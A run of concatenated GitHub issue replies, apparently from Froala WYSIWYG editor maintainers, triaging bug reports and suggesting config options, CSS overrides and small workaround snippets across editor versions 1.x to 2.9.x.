https://wysiwyg-editor-roadmap.froala.com/public.. @felskov are you able to reproduce it with the latest version 2.9.1?. Thanks for the details. We are working on addressing #2887 in the next minor release. I am going to mark this as closed for now as we can no longer reproduce it and will be happy to reopen it if someone can confirm the problem is still there.. We have 2 CSS rules that specify how the selection should be: https://github.com/froala/wysiwyg-editor/blob/master/css/froala_editor.css#L159. They are added there so that there is a consistent highlight color in all browsers. If you'd like to use other colors, then you can override them:\ncss\n.fr-wrapper ::-moz-selection {\n  background: auto !important;\n  color: auto !important;\n}\n.fr-wrapper ::selection {\n  background: auto !important;\n  color: auto !important;\n}. For such cases, when you click just below the image at the bottom of the editor it would add a new line after the image. . @surajgn do you think you could send us a recording?. Thanks for sending more details, @surajgn. In IE, it would be necessary to click in the space below the image, not to the right of it. I know this might be a little bit unintuitive, but it is the best we could do for now as of some IE limitations when working with images.. @surajgn we were able to reproduce it sometimes. Unfortunately, we're facing some limitations for it in IE and I have to mark it as a wontfix. We're looking into alternatives with the hope to come with a better resolution shortly.. The Froala Editor requires at least version 1.11.0 for jQuery.. @BoilerTom90 it looks like there might be a conflict with some CSS from your page. Could you please check on that?. @angusgrant do you think you could send a recording for it? Thanks in advance.. Please use a higher zIndex: https://jsfiddle.net/froala/23c5gnz4/80/.. It looks like a conflict with some CSS that you have there inside your app. I would suggest to check on that with the developer tools.. @ShanmugaPriyanV we keep track of issues separately. Please instead open a separate ticket for each issue you might face. For fast turnarounds, please make sure that you provide the Steps to reproduce the problem.. See https://www.froala.com/wysiwyg-editor/docs/options#entities.. At this moment, we're facing some limitations on mobile devices, thus the option is available only on desktop platforms.. Sure, on iOS there is the keyboard and because of it we cannot take the screen size correctly in JS.. @mirazero @TimMeissner @dima888 could you please make a recording?. @dima888 are you able to reproduce this on our website too?. @herumtreiber are you able to reproduce on our website?. @TimMeissner thanks for the jsFiddle. We'll check it shortly.. Thanks @TimMeissner. We were able to reproduce on Windows 8 with IE 11 by creating scroll on the page and then focusing in the editor and selecting a new font family.. See: https://www.froala.com/wysiwyg-editor/docs/events#paste.before. It's fixed in 2.9.2.. It's fixed on the current master.. @Pratibha-M please use the keepFormatOnDelete option for that.. This is fixed on the current 2.9.2 version.. @greggreenhaw I believe that somehow in a Cordova app, the JS gets minified or there are some changes done on it. That makes some unicodes that we have in the code to be transformed.. Unfortunately, we require this in order to have the editing work correctly. Do you think you could create an app where to replicate this?. I am closing this for now as we don't have a way to reproduce it and because the usage of the editor in Cordova apps is quite isolated. . isMac is actually looking for the OS. For iphone, we recommend using the isIOS method instead.. The last commit introduces the option imageAddNewLine which when enabled would add a new line after image when it is the last element inside the editor.. https://www.froala.com/wysiwyg-editor/docs/methods#size.syncIframe. We investigated this problem and it comes mainly from the fact that there are 2 nested contenteditable elements which we don't support at this moment. I am moving this for now to backlog.. @shaivi-mob-incedo please provide details to reproduce this issue.. Unfortunately, when we get the HTML from Word in clipboard, it doesn't include the link to image and that is why it is not retained. I am putting below for reference what we received from Word:\n```html\n[if gte vml 1]><v:shapetype id=\"_x0000_t75\"\n coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\"\n filled=\"f\" stroked=\"f\">\n <v:stroke joinstyle=\"miter\"/>\n <v:formulas>\n  <v:f eqn=\"if lineDrawn pixelLineWidth 0\"/>\n  <v:f eqn=\"sum @0 1 0\"/>\n  <v:f eqn=\"sum 0 0 @1\"/>\n  <v:f eqn=\"prod @2 1 2\"/>\n  <v:f eqn=\"prod @3 21600 pixelWidth\"/>\n  <v:f eqn=\"prod @3 21600 pixelHeight\"/>\n  <v:f eqn=\"sum @0 0 1\"/>\n  <v:f eqn=\"prod @6 1 2\"/>\n  <v:f eqn=\"prod @7 21600 pixelWidth\"/>\n  <v:f eqn=\"sum @8 21600 0\"/>\n  <v:f eqn=\"prod @7 21600 pixelHeight\"/>\n  <v:f eqn=\"sum @10 21600 0\"/>\n </v:formulas>\n <v:path o:extrusionok=\"f\" gradientshapeok=\"t\" o:connecttype=\"rect\"/>\n <o:lock v:ext=\"edit\" aspectratio=\"t\"/>\n</v:shapetype><v:shape id=\"Picture_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\"\n alt=\"Editor photo\" style='width:150pt;height:100pt;visibility:visible;\n mso-wrap-style:square'>\n <v:imagedata src=\"file:////Users/me/Library/Group%20Containers/UBF8T346G9.Office/TemporaryItems/msohtmlclip/clip_image001.jpg\"\n  o:title=\"Editor photo\"/>\n</v:shape><![endif]if !vmlendif\n``.

Sure, you can do that, @binod12 . @jpgilchrist what would be very helpful is a jsFiddle where we can reproduce it. However, it is unlikely for us to turn off the resize events because they are important in correct positioning of the editor UI elements.. @jpgilchrist do you have any updates on this? I am closing it for now, but would be happy to reopen if we'd get to a conclusion where it would make sense to implement such a feature.. Unfortunately, in MS Edge we're getting the HTML like this from the browser clipboard and there is not too much we could do to convert it to lists.. It's fixed in version 2.9.2 and on the master branch.. @farahat80 Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. You can use https://www.froala.com/wysiwyg-editor/docs/events#file.inserted.. @adueck Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. It is not necessary to have an account to save the Fiddle. Just fork the one I sent and then make the updates and send us the result URL.. Should be fixed on the current Github master.. The built-in popups have been designed for the main editor toolbar, not for being used nested and that is the reason why they don't appear correctly. To get them work as you're looking for, the best way would be to make changes directly on the editor source code on the following methods:video.showInsertPopup,image.showInsertPopup,table.showInsertPopup.. @felskov could you please check if you have any plugins enabled in Chrome that might prevent such a behavior? It works fine on my side.. Maybe it is the keyboard layout. Are you using an US one?. Thanks for the quick response, @felskov.. Please upvote this on https://wysiwyg-editor-roadmap.froala.com/public/ideas/3558.. @VenkateshJhipster are you experiencing this if you enable thekeepFormatOnDeleteoption?.

Could you please update the jsFiddle with the HTML that you're having there after paste? Also, what browser and OS are you using? Thanks.. @ShanmugaPriyanV pinging on it.. Closing this as we haven't got enough details.. I am closing this due to lack of response. I would be happy to reopen it if we get more details.. @ShanmugaPriyanV it is scheduled to be added in version 2.9.3 and it is marked as an enhancement..

Closing this due to lack of response. The problem might be related to some fixes in version 2.9.2. . Thehtml.insert` method is not designed to focus the editor, so it would put the HTML at the end of the editable element. To get it inserted as you want, you should focus it first: https://jsfiddle.net/froala/L27wmobk/1/.. @bertoost are you seeing these problems here https://www.froala.com/wysiwyg-editor/examples/font-awesome-5-js? . @bertoost sorry I tagged you wrong. :)\n@bpautsch are you seeing these problems here https://www.froala.com/wysiwyg-editor/examples/font-awesome-5-js?. The editor is designed to filter the embeded code. By default, it validates it by using a regular expression. If you'd like to change that, then add the following line and update the regex just before initializing the editor:\njs\n$.FE.VIDEO_EMBED_REGEX = /^\\W*((<iframe.*><\\/iframe>)|(<embed.*>))\\W*$/i;. https://github.com/froala/wysiwyg-editor/issues/3152#issuecomment-437371627. @javeriaanwer It looks like you're not including jQuery before the Froala Editor.. By default, the editor is designed to convert B tags into STRONG. If you'd like to disable that, please see: https://jsfiddle.net/froala/k8jbpgf6/.. I am closing this due to lack of response. Would be happy to open it again if you can send us steps to reproduce it in a demo.. @moses-bowman Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. It's fixed with the current master from Github.. @MrGrande are you able to reproduce this on our website demo: http://froala.com/wysiwyg-editor?. @MrGrande what you could try is to use the following option: zIndex: 999999..

In Vue, it might be better to load it like this: https://github.com/nhnent/tui.image-editor#via-package-manager.. It is not related to inline toolbar. It would be best to try opening an issue for this directly to TUI as the problem appears to be from that.. See https://www.froala.com/wysiwyg-editor/examples/tui-advanced-image-editor. You should also include the TUI lib.. See https://github.com/froala/wysiwyg-editor/issues/1465#issuecomment-248594297.. That is because you should call undo.reset after you set the HTML: https://jsfiddle.net/froala/ab2qfj0r/.. @AshishTiwariMEAN it appears to be a problem from your config. Please contact us via our website: https://www.froala.com/wysiwyg-editor/contact.. It's fixed on the Github master, and will be included in release 2.9.3.. Updated working example: https://jsfiddle.net/froala/ojwhvppr/323/.. The editor API is designed on an atomic design pattern. Thus, calling one method is not automatically doing all the job and you have to also call other methods, such as: https://www.froala.com/wysiwyg-editor/docs/methods#size.refresh.. We don't have an option at this moment for clearing the style and reverting it to a clear state.. Thick style is designed to set the cell borders to 2px. That appears to work correctly to me and you can see it in the attached screenshot.\n\n. What OS are you using? Are you able to reproduce this in other browser as well?. @javeriaanwer could you please make a jsFiddle?. @javeriaanwer I actually made a jsFiddle for it: https://jsfiddle.net/froala/wc5c3jhk/2149/ and indeed I was able to reproduce your problem. Unfortunately, controlling the order of the attributes is not something that we'd be looking to do - the order of the attributes is set by the browser and if we'd try to change it that would be a huge performance drop.\nRegarding draggable, I was not able to reproduce it. If you could update the jsFiddle to reflect that, I would be happy to open this again.. @n-rodriguez it looks like the page is being reloaded via AJAX without destroying the previous editor instance. Please make sure that before the page is being reloaded you destroy the editor instance by using the destroy method.. Can you replicate it here https://www.froala.com/wysiwyg-editor/examples/iframe?. Please see: https://github.com/froala/wysiwyg-editor/issues/3174#issuecomment-439435283.. @n-rodriguez are you able to reproduce it on https://www.froala.com/wysiwyg-editor/examples/iframe?\n. Actually, the emoticons.insert method has 2 params. The first is the unicode, while the 2nd one is the image to be inserted. We'll update the docs for it.. Sure: https://jsfiddle.net/froala/4vt96kga/. The editor is actually keeping the heading - see the attached image.\n\n. @eyewire could you send us a screenshot of the code in Code View mode?. In the code that you sent, I can see that there is an H2 tag which is the correct behavior. It is not displaying as a heading because it has inline style which comes from Word: font-size.. I am reopening this so that we can check the image upload again. Do you think you could also send us a recording?. That is strange - it looks we have written the test case for this incorrectly.. Closing this here and moving discussion to the support channel for access to the staging env.. @n-rodriguez do you think you could create a demo app on Github and send it to us to test?. Please reach us on the support channel with more details on that: https://www.froala.com/wysiwyg-editor/contact.. I am going to close this in the meanwhile here.. @wmacdonald919 I am not able to reproduce it. Do you think you could make a recording?. To me it looks more like embedly plugin not working correctly, as they should be able to detect when the document is ready to apply the script. I think it might be good to reach them and ask for an opinion on that.. @wmacdonald919 actually it is a problem from the editor and we're going to fix in the next release. Fix is already ready, we just have to do a bit of more review. In the meanwhile, please use this fix: https://jsfiddle.net/froala/f6wc4khn/.. It is going to be a minor release - 2.9.2. @GnanaAjana Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. I am closing this as we don't have a way to reproduce it. I would be happy to look into it again, if you could provide a jsFiddle to reproduce it.. I think you're including the align JS before the Froala Editor. . @george-norris-salesforce could you please confirm if the problem for this is solved or you need further help?. @frogga67 it looks you're having a bad encoding there on the page. Could you please check if the encoding on the page is set to utf-8?. You can include it only in the iframe.. @srosenthal do you think you could also send a recording?. @LoicLopes unfortunately, this is a browser problem and there is not too much we could do about it. We have on our plan to do something different for non-editable text and we're planning on how to roll that out. . At this moment we don't have this feature, however, please make sure you subscribe to our newsletter to receive news as soon as it becomes available: https://www.froala.com/wysiwyg-editor/download#updates. You can also upvote it here: https://wysiwyg-editor-roadmap.froala.com/public.. We just reviewed it and we're going to keep it this way as we're using the same behavior for images.. See https://github.com/froala/wysiwyg-editor/issues/3152#issuecomment-437371627.. Reopening it and marking as an enhancement.. Duplicate of https://github.com/froala/wysiwyg-editor/issues/3081. Duplicate of https://github.com/froala/wysiwyg-editor/issues/3171. @guilabonte Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for further details, @guilabonte. At this moment, the link predefined list is designed to be using only the options available in the UI. We consider this more of a feature-request. Do you mind adding a request for it on https://wysiwyg-editor-roadmap.froala.com/public?. We don't consider it a bug - the dropdowns are not designed to be limited to the editor size. Actually, you can control them via CSS:\ncss\n.fr-command.fr-btn+.fr-dropdown-menu .fr-dropdown-wrapper .fr-dropdown-content,\n.fr-command.fr-btn.fr-active+.fr-dropdown-menu .fr-dropdown-wrapper {\n  max-height: 150px;\n}. We just reviewed it and at this moment, the Word implementation is not designed to keep that formatting. I would suggest opening a feature request on https://wysiwyg-editor-roadmap.froala.com/public. Thanks in advance. \ud83d\ude4f . Thanks for reporting it @SeanKendle. It looks it was introduced in https://github.com/froala-labs/froala-editor-js-2/commit/86a5af90ba05b3c2f4298786f262fed19e7f5dc5#diff-533f18d9df1023739c9f58853f604cdc.. Should be fixed on the current master.. For that, I would recommend using the following code:\njs\n$('#editor').on('froalaEditor.initialized', function (e, editor) {\n  editor.$wp.append('your_html_here').\n}).froalaEditor();. @RickCole21 could you please give us such a video example?. I am closing this due to lack of response. Would be happy to look into it again if we get more details.. @javeriaanwer are you able to reproduce it with the latest 2.9.1 version?. I just tried to reproduce it on the website demo https://www.froala.com/wysiwyg-editor which is using the version 2.9.2 and works fine to me. I used the latest Edge and Windows 10 on BrowserStack.. At this moment, we don't have such a feature. I would recommend getting the editor content with html.get method and then use the approach described on https://stackoverflow.com/questions/2219526/how-many-bytes-in-a-javascript-string to calculate the size of the string.. Same with froala-labs/froala-editor-js-2#677. . Should be fixed on the current master.. @swarzech could you please provide details about how we can reproduce this problem on our website: https://www.froala.com/wysiwyg-editor?. I am closing this to lack of details. I would be happy to reopen it if we get more details.. @angeliuz Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Closing this due to lack of response. Would be happy to look into it if we get more details.. It looks like you have hidden the editor unlicensed message by using some custom CSS / JS. Please use our product legally by purchasing a license from https://www.froala.com/wysiwyg-editor/pricing.. Thanks for the feedback @awegmueller. Last commit is changing the way shortcuts are being shown. The tooltip was designed there mainly for shortcuts and it doesn't make sense to show it for the rest of the elements where no shortcuts are available and just show the same text.. Please also call https://www.froala.com/wysiwyg-editor/docs/methods#toolbar.disable. Although these methods might seem to do the same thing, they are disabling different parts.. See https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls. When image/videos are uploaded using the file dialog, the editor is designed to insert them as file instead of rich media.. When you resize the editor using the first / last column right, the editor is designed to resize all the cells to scale accordingly.. @javeriaanwer I would recommend putting a feature request on https://wysiwyg-editor-roadmap.froala.com/public.. Duplicate of https://github.com/froala/wysiwyg-editor/issues/1962. @joelwmale this looks more like a problem from the reported URL not being correct. Could you please send a request to our support team on https://www.froala.com/wysiwyg-editor/contact instead?. @MadMatt25 Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. That is because for .item you set overflow: auto;. The best thing would be to use just overflow: hidden for it.. Unfortunately, we don't have a different way of setting the popups for the toolbar buttons at this moment due to some design constraints.. Thanks for reporting this. What I would suggest in this case would be to use the https://www.froala.com/wysiwyg-editor/docs/methods#size.syncIframe method when you expand the summary block. . It's fixed on the current master.. Sure, you could be using the https://www.froala.com/wysiwyg-editor/docs/events#popups.show.[id] event, where you replace id with image.edit and there you show the replace popup: https://www.froala.com/wysiwyg-editor/docs/methods#popups.show.. I can confirm that is is a bug. In the meanwhile, please use the following workaround: https://jsfiddle.net/4tw0Lgus/.. Thanks for your PR, @jakoandersen. We do not accept PRs directly here, thus I am going to close it now and our team will consider your suggestion as a possible solution.. It is for sure a conflict with some CSS from your page. Could you please check on that?. It's fixed on the master branch from here.. You should be changing it to:\njs\nhtmlAllowedTags: ['.*'],\nhtmlAllowedAttr: ['.*', 'attributeName', 'dur', 'repeatCount', 'begin', 'keyTimes', 'values'],. After uploading an image, we designed the editor to select the image so that it is possible to easily change image properties. This is a built-in behavior and it highly unlikely for us to change it. The easiest way to unselect the image would be to use the ESC key.. This doesn't seem to be a bug. If you want to set a default font in the editor, please use CSS as here: https://jsfiddle.net/froala/9pgbr1qa/.. @mirazero could you please make a recording to highlight this problem on our website?. I am closing this due to lack of response. Would be happy to open it back if we get further details.. We just checked it and looks like the problem is coming from Code Mirror and not from the editor. To display the code source highlighted, we are using Code Mirror which breaks in rtl - please find an isolated jsFiddle here: https://jsfiddle.net/froala/ng4stkz6/.. By default, the editor uploads to the browser memory and that is why the image.uploaded event is not fired. You can see it firing when uploading to a server here: https://jsfiddle.net/froala/jyd91up5/. See https://www.froala.com/wysiwyg-editor/docs/options#htmlAllowedAttrs. The charCounter is designed only for text mode. At this moment, it does not support Code View and we would recommend disabling code view when using the char counter. Please consider suggesting this feature on https://wysiwyg-editor-roadmap.froala.com/public.. At this moment, we support power paste only from MSWord. It would be great if you could open a request for adding Libre Office here: https://wysiwyg-editor-roadmap.froala.com/public.. See https://www.froala.com/wysiwyg-editor/docs/options#typingTimer. The editor is using an option which tells the editor how fast to put changes in undo stack when doing an action.. This should be fixed in version 2.9.3. Do you think you could try again with the latest master?. @nidhin038 could you please send us the video you are using?. If no preview is being shown, the problem might come from the format of the file which is uploaded. We are using the VIDEO tag  which in Safari supports only mp4 at this moment,.. Same with https://github.com/froala-labs/froala-editor-js-2/issues/823.. @timavaza this should be fixed on the current 2.9.2 version. Do you think you could check again and let us know if you still face the problem?. I can confirm that it is a regression - we'll address this shortly.. We checked on it and it looks Embedly is somehow getting stuck. We're reaching them for more details.. @novikov1337danil I would recommend that when you return the path from the server to include the absolute path instead of the relative one.. See https://jsfiddle.net/froala/wc5c3jhk/2205/.. Yes, it is fixed.. It should be fixed on the current Github master.. @UCIS thanks for the feedback. On 1, we're going to check it further and see about how we can enable the same action on drag&drop.\nRegarding 2, removing DIV from htmlAllowedTags is not something we recommend doing, though we'll see if we can overcome it somehow.. You can control that through: \nhttps://www.froala.com/wysiwyg-editor/docs/options#pasteAllowedStyleProps\nhttps://www.froala.com/wysiwyg-editor/docs/options#pasteDeniedAttrs\n. It's fixed on the master branch from Github.. Duplicate of #3283 . Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Then I would be closing this for now and happy to reopen it if we have a way to reproduce it.. We'll be looking into it in more details shortly - there are a couple of other issues related to iOS popups/toolbars and we'll most likely be checking them together in a batch. Unfortunately, cannot provide an ETA at this moment.. This is a known IE problem which is happening when using some CSS attributes. In your case, they are: min-height and overflow - removing them would fix the problem right away. Unfortunately, we don't have a fix for this problem.. @bholtbholt Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. What would help is a jsFiddle from where to paste content to another jsFiddle.. @bholtbholt it's not clear how we can reproduce it on this jsFiddle. Can you maybe put the HTML which gets pasted incorrectly in on jsFiddle? Unfortunately, without having that specific HTML it's a shot in the dark.. Thanks for further details, @bholtbholt. I've tried to reproduce it without any success. I am closing it for now and would be happy to look into it if we get more details.. @waynechaw what browser and OS are you using?. See https://www.froala.com/wysiwyg-editor/docs/options#wordAllowedStyleProps.. For binding an external button, please see: https://www.froala.com/wysiwyg-editor/examples/external-button. The problem in your case is that the editor focus is being lost when clicking on an external butotn.. For that, I would recommend to create a custom button in the table toolbar and set it there: https://www.froala.com/wysiwyg-editor/examples/custom-buttons.. Sure, you can use:\nCSS\n.fr-view table td, .fr-view table th {\n   border: none;\n}\nPS: We are using this channel mainly for bug reports. For tech questions, please use our website contact form and for feature suggestions: https://wysiwyg-editor-roadmap.froala.com/public. Thanks in advance! \ud83d\ude4f . @brycehill when you click outside of the editor, the editor is losing the focus - you can see that the cursor is no longer in the editor. Then, when using a button, it is scrolling back up because it focuses at the beginning of the editor which is the behavior we have in place when no focus is active. At this moment, we don't have a feature to store position when the editor is unfocused - it would be great if you could suggest it to our roadmap: https://wysiwyg-editor-roadmap.froala.com/public.. Make sure you follow the details from here for displaying the content: https://www.froala.com/wysiwyg-editor/docs/overview#frontend. You could be using the html.get event and wrap it with that div, though this is hackish workaround.. @brianlenz how did you got to that specific HTML?. It is strange that even if the image was removed from the server, there is no IMG tag in the HTML.. Do you have some code which is handling image removal and maybe not removing the caption?. @brianlenz do you have any idea on how he removed it? Did he clicked on it and removed by using the image tool?. @brianlenz unfortunately, we are not able to get to this HTML just by using the editor tools. Thus, I am closing this for now and would be happy to look further into it if you could provide specific steps to get to this.. See https://jsfiddle.net/froala/b4o6dsLe/. Those spaces were added because of the new lines and spaces which are added from the template. Please make sure that you don't have such new spaces.. Thanks for reporting this @karanjariwala. Unfortunately, this is a browser rendering problem when using contenteditable=\"false\" inside a content editable field and we cannot do too much about it.. @den11100 is this happening only on specific browser sizes or on all sizes?. @meiordac Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @meiordac destroying the editor makes the editor object unavailable because the instance is not used anymore. This, it is normal to have this error happening.. @bholtbholt the current colors popup is made specifically to work with tabs. If you want to change it, then I would recommend creating a separate plugin based on it instead and update the behavior as well.. Should be fixed now on the latest master. It would be amazing if you could give it a try and let us know if you still face any problem. Thanks in advance!. Thanks for the suggestion, @awegmueller. I moved this to https://wysiwyg-editor-roadmap.froala.com/public/ideas/6561 and looking forward to getting others feedback on it in order to implement it.. The font size is applied as an inline SPAN and not on the paragraph level. Thus, it is not possible to change the line-height only on it because the browser won't render.. While this might work in your case, it would not be working correctly when you just select parts of the text and have there different sizes.. Thanks for further checks, @bch36. Unfortunately, this is a fix that I am not really into adding it because we would lose the default font sizes that are on the elements from the page.. The videoDefaultWidth option is available only for the uploaded videos, not for the ones inserted via Youtube / Vimeo. In order to make videos responsive, you should enable videoResponsive option.\n. @emeryowa that is right, though they are being overridden by CSS and the video is responsive - taking the entire width. . @SJDrwsh could you please send a recording for this problem happening on our website demo (https://www.froala.com/wysiwyg-editor)? Thanks in advance.. Sorry, it looks I missed your reply on the other ticket. For the button, the display: inline-block; is causing that problem.. Should be fixed in current master.. We are just using the Embed.ly API: https://embed.ly/. It looks this is the way they are embedding MP4.. @navneetnagpal do you think you could look into this?. @sblattj what do you mean by multiple styles?. Should be fixed on the current master. Would be great if you can give it a try.. @sblattj could you please let us know the steps to follow for that? Thanks in advance.. Seems like duplicate of #3335.. We are looking to release it in the upcoming 2 weeks.. Please enable https://www.froala.com/wysiwyg-editor/docs/options#imageAddNewLine. Please enable keepFormatOnDelete option.. The \u00fc character should be put as unicode so that it appears right in all browsers.\n. ",

In a few days.\n\nOn 01 Sep 2014, at 09:12, lraivio notifications@github.com wrote:\nAny update on when this feature will be released? Eagerly waiting for this.\n\u2014\nReply to this email directly or view it on GitHub.\n. v.1.1.4 is available on this repository as a pre-release and it will be released officially during next week.\n. We use this repo as our official bug tracker and we kindly asked you in the readme to use it appropriately.\n\nTherefore I'm closing this issue since it is not a bug.\n. We need some more details:\n- Device name\n- Browser\n- Resolution\nThe Android default popup with copy, cut, etc. cannot be hidden.\n. Please try with the version from this repo (v1.1.8 - not release officially). It should be fixed.\n. If you are opening the file locally in Firefox and not from a web server please read Fonts not Showing in Firefox: http://editor.froala.com/browsers.\nOtherwise make sure that you have Font Awesome included.\n. Closing this issue due to lack of information.\n. We already fixed the placeholder and the focus / blur issues few commits ago. This works fine on the current master version.\n. Updated. Thanks for pointing this out.\n. We don't merge pull requests into this repository. However we made the changes you suggested: f12b8871562c182a002e010cd3ed8bd513c1d09c. Thank you!\n. First of all are you using the latest version from this repository?\nSecondly, we don't have enough information to reproduce the issues. What HTML do you pass over to the setHTML() method? We tried with some random text and it works fine. What do you mean by \"delete the element\"? Deleting characters works okay.\n. We have updated this repository with some fixes for lists in IE9. Please test and let us know if you encounter any issues.\n. There's already an event for this. Please see: https://editor.froala.com/events#imageInserted\n. Yes, it is after the image was inserted. It works like  this because \"Insert Image\" is design to insert an image in the editor. We haven't thought about using \"Insert Image\" to insert an image somewhere else. We'll talk about it and let you know our conclusion.\n. Docs have been updated.\n. Unfortunately, we have no Russian speaker among us. The only way to improve the translation is with help from our users. I just made the changes you suggested. If there is any other change you consider necessary, please let us know.\n. I just checked and the corrections you gave us are there. For example Bold: \n\nPlease make sure that you have updated the /languages/ru.js file when upgrading to the new version. If you are using Bower, the language files are not included in Bower, they need to be included separately.\n. Yes, it seems I missed that one. Just made the update.\nI would really appreciate if next time you have translation suggestions, just say \"Drop file: \u041f\u0435\u0440\u0435\u043c\u0435\u0441\u0442\u0438\u0442\u0435 \u0441\u044e\u0434\u0430 \u0444\u0430\u0439\u043b\" or add the image here, directly on Github, instead of adding multiple links to different images, which makes them very hard to follow for a person that doesn't understand Russian.\n. This happens only when you try to correct the spelling using ctrl + left click and not on right click.\n. @nicooprat you should do return false at the end of the callback to stop the event from bubbling up. I see that you're trying to prevent enter. There is a built-in way for doing it: https://www.froala.com/wysiwyg-editor/docs/options#multiLine.\n. The editor toolbar should freeze when selecting multiple cells, but shouldn't freeze when selecting only one cell. This may be the same with #1265.\nAdditionally, the editor is not designed to select both header and body cells, because you can't merge them and they also have different styles.\n. Selecting both is prevented (a selected cell has the blue border). The issue you recorded is related to the fact that the editor toolbar freezes, which is not happening anymore on the master branch.\nPlease try this with the master branch and let me know if it still happens. Closing this until then.\n. Selecting multiple cells in a table should freeze the editor for multiple reasons:\n1. The editor toolbar buttons have no meaning for the current selection;\n2. We want to select cells and to achieve this we need to prevent text selection;\n3. In order to have the same cell selection behaviour in all browsers, Froala comes with a custom cell selection tool. For this reason, we need to prevent default cell selection from various browsers when contenteditable=\"true\".\nHowever, when selecting only one cell, the editor toolbar shouldn't freeze. I'm not able to replicate this. Is there something else, except left click, that you are pressing? Are you using the latest master version? Our website (https://froala.com/wysiwyg-editor) doesn't use the latest version from Github until we make a new release.\n. Yes, it can be replicated on our homepage, because it doesn't use the latest version from master until a new release is made.\nThis is cannot be replicated on the latest master version from Github. Please try the master branch and let me know is you can replicate it there. Closing this until then.\n. @justincy could you please make a jsFiddle?\n. @ikurpis the editor is designed to use shared elements so that you don't end up with 10 image popups on the page in DOM if you have 10 editor instances. What happens in your case is that the editor initializes when you load it first time, but you never destroy that instance. This leaves the elements outside of the DOM and causes the problem. To avoid it, you should destroy the current instances before loading the other page.\n. The icons for alignment are defined in the Align plugin. It appears that this problem comes when using the image plugin without the align one. Defining the icons in JS should fix it http://jsfiddle.net/rtte3h4c/1/:\njs\n$.FE.DefineIcon('align', { NAME: 'align-left' });\n$.FE.DefineIcon('align-left', { NAME: 'align-left' });\n$.FE.DefineIcon('align-right', { NAME: 'align-right' });\n$.FE.DefineIcon('align-center', { NAME: 'align-center' });\n$.FE.DefineIcon('align-justify', { NAME: 'align-justify' });\n. I marked it as enhancement. There should be a check in place to see if the icons is already defined.\n. @nicooprat Indeed, after calling selection.setAtEnd the selection.restore method should be called. We'll update the docs to make that a bit more clear. Thanks for the feedback!\n. By shifts, do you mean page scroll?\n. Updated. Thanks.\n. @muslim-niche please see issue #2545.. The option is called tooltips and the default value is true. Just set it to false if you don't wish to use tooltips.\njavascript\n$('.selector').froalaEditor({\n    tooltips: false\n})\n. There are 2 ways to disable the Quick Insert Button:\n1. Don't include the Quick Insert plugin (you can include only the plugins that you are using).\n2. If you include all the plugins and want to use just some of them, then use the pluginsEnabled option.. @AhHa45, that is true. I'm adding this to our TODO list.. At a closer look, the code above doesn't work. Marking this as enhancement.\n. Thanks for your suggestion, our documentation has been updated.\nThe confusion was generated by our internal naming convention: use underscores for file names and camel case for variables, options, methods, plugin names and so on.\nThe toolbarButtons option now states the plugin name required by each button and a link to the complete list of plugins with files required by each of them. The pluginsEnabled option also specified the available plugins\n. Are you able to reproduce this on our website?. Sure, @aaclayton. Using span instead of figure is quite a debated topic, both internally and among Froala Editor users. Please check out issue #2206 for more details.. Done. Thanks for the heads-up!. @delian7 I apologize for not having an answer for you for such a long time. We've tried multiple times to find a fix for this, but the truth is that version 2 of the editor was not designed to work with em. We will make sure this is not going to happen in V3.\nUntil then, there is a workaround, but it comes with a compromise. We cannot fix this issue and also keep the correct order for issue #2081 that you reported. Currently, the editor will never create such an output (like the one from issue #2081), but it did happened some time ago, in the beginning of V2. That code was generated a long time ago with the editor and that's why you had such code in the editor in the first place.\nWe would really appreciate your input on this before taking any decision about the approach we should take. Thanks in advance!. Thanks for reporting this. However we can't figure out the exact steps to reproduce the issue. Is it a specific action you are trying to achieve that causes the editor to freeze? We can't even say if it's a simple click, double click or click and drag. Also what is the origin of the click? Any extra feedback you could provide is highly appreciated.. This was not intended. However, it shouldn't have normally happen. The _tableMap() function is called without an argument only when there is a table selection in the editor. The source of your error indicates something is wrong, even though this issue is fixed.. @aarndt is there a particular alternative that you would prefer to have for advanced image editing?. If the dialog is disabled, the default action is to clean the styles. Please make sure you are using the latest version of the editor and let us know if you still have this problem.. The OK button uses the hex value in the input, and no longer clears it out. When the HEX Color input is empty, hitting the OK button will remove the background color.\nThe OK button is only meant to be used together with the HEX Color input, and not with the colors in the list. I understand your concern about this, and I just aded on our TODO list. Thanks.. @d3chapma your problem is related to issues #2104 and #2081. The current version of the editor was not designed to work with em. The code you highlighted in the issue's description was added as a workaround to address issue #2801, but it causes multiple spans to be created for the same css property if you are using em.\nWe'll make sure the next major version of the editor supports em. Until then, removing that code snipped will fix your problem.. @ayjee Do you have any updates that could help us reproduce this issue?\nI'm going to close this issue for now, due to lack of response. Once we have more details and we are able to reproduce it, we will reopen the issue.. @wdc-admin could this issue be reproduced on other OS than Linux?\nI would recommend you 